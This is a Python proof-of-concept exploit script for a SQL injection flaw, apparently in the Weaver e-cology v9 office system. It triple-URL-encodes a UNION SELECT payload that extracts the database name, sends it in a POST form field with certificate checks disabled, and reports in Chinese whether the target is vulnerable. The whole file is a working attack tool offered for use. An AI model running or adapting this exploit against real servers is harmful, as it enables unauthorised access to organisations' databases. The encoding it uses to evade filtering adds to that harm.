#!/usr/bin/env python
# -*-coding:utf-8 -*-

import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

def encode(string):
    encode_string = ""
    for char in string:
        encode_char = hex(ord(char)).replace("0x","%")
        encode_string += encode_char
    return encode_string

def get_payload(payload):
    string = payload
    for i in range(3):
        string = encode(string)
    return  string
    
def verify(url, paylaod):
    paylaod_string =  get_payload(paylaod)
    data = "isDis=1&browserTypeId=269&keyword=" + paylaod_string
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    try:
        res = requests.post(url, verify = False, headers=headers, data=data, timeout=3)
        info = res.json()
        if "result" in info:
            if len( info["result"]) != 0:
                if "show1" in info["result"][0]:
                    return info["result"][0]["show1"]
    except:
        pass
    return ""
        
if __name__=="__main__":
    payload = "a' union select 1,''+(select db_name())+'"
    url = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 ecology-v9-sqli.py", url)
    info = verify(url, payload)
    if info != "":
        print("[+]漏洞存在，执行 sql 语句为：", payload, "数据库名称为：", info)
    else:
        print("[-]漏洞不存在")
